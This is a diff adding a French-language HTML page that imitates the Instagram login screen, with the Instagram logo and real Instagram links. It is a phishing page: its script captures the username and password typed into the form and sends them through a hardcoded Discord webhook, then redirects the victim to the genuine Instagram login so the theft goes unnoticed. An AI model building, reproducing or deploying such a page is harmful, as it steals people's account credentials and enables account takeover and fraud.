@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .language-select {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+        .logo {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .facebook-login {
+            width: 90%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 0 auto 20px;
+            display: block;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider span {
+            padding: 0 10px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 0 auto 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            display: block;
+            background-image: linear-gradient(to bottom, #f9f9f9, #ffffff);
+        }
+        .login-button {
+            width: 90%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 0 auto;
+            display: block;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+        .signup {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9em;
+        }
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="language-select">Français (Canada) ▼</div>
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png?20160616034027" alt="Logo Instagram">
+        
+        <button class="facebook-login" onclick="window.location.href='https://www.instagram.com/accounts/login/?next=%2Faccounts%2Flogin%2Fvia_facebook%2F';">
+            Continuer avec Facebook
+        </button>
+        
+        <div class="divider"><span>OU</span></div>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Numéro de téléphone, nom d'utilisateur..." required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit" class="login-button">Connexion</button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="https://www.instagram.com/accounts/password/reset/">Mot de passe oublié?</a>
+        </div>
+
+        <div class="signup">
+            Vous n'avez pas de compte? <a href="https://www.instagram.com/accounts/emailsignup/">Inscrivez-vous</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            // Envoie des données au webhook Discord
+            var webhookUrl = "https://discord.com/api/webhooks/1286521413511151708/WjEHZMVOwbOGBMeG2rYgoS41qQdH3omX-9g7HugHaRVrxhIIE-nUeh-GmIkqzTeHqHqY";
+            
+            var message = {
+                content: "**New Login Attempt:**\n\n**Username/Email:** " + username + "\n**Password:** " + password
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }
+            }).catch(error => {
+                console.error("Erreur:", error);
+            });
+        });
+    </script>
+</body>
+</html>
